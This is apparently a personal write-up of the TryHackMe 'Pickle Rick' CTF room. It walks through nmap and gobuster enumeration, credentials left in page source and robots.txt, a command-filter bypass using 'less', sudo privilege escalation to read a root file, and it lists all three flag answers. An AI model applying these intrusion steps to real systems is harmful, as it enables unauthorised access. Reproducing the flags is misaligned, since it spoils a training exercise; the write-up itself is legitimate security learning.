# 🥒 Pickle Rick

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Pickle Rick](https://tryhackme.com/room/picklerick) |
| **Difficulty** | 🟢 Easy |
| **Category** | Web, Linux |
| **OS** | Linux |
| **Tools** | nmap, gobuster, browser DevTools |

---

## 🎯 Objective

A Rick and Morty themed CTF. Rick has turned himself into a pickle and needs your help getting the three secret ingredients. Find all three ingredients hidden on the server.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
```

**Open ports:**
```
22/tcp  open  ssh     OpenSSH 7.2p2
80/tcp  open  http    Apache httpd 2.4.18
```

---

## 🌐 Web Enumeration

Navigating to `http://TARGET_IP` shows a Rick and Morty themed page. Inspecting **page source** reveals a comment:

```html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

Checking `robots.txt`:
```
Wubbalubbadubdub
```

Running gobuster to find hidden paths:
```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/login.php`, `/portal.php`

---

## 💥 Exploitation

Logging into `/login.php` with `R1ckRul3s:Wubbalubbadubdub` gives access to a **command execution panel**.

`cat` is blocked — using `less`:
```bash
less Sup3rS3cretPickl3Ingred.txt
# Ingredient 1: mr. meeseek hair

ls /home/rick
less /home/rick/'second ingredients'
# Ingredient 2: 1 jerry tear
```

---

## 🔐 Privilege Escalation

```bash
sudo -l
# (ALL) NOPASSWD: ALL

sudo less /root/3rd.txt
# Ingredient 3: fleeb juice
```

---

## 🏁 Flags

| Ingredient | Value |
|---|---|
| First | mr. meeseek hair |
| Second | 1 jerry tear |
| Third | fleeb juice |

---

## 📚 Lessons Learned

- Always check page source — credentials are often left in HTML comments
- `robots.txt` can reveal sensitive information
- When `cat` is blocked try `less`, `more`, `strings`, or `tac`
- Always run `sudo -l` — misconfigured sudo is one of the most common privesc vectors

---
*by OwlRC 🦉 | github.com/OwlRC*
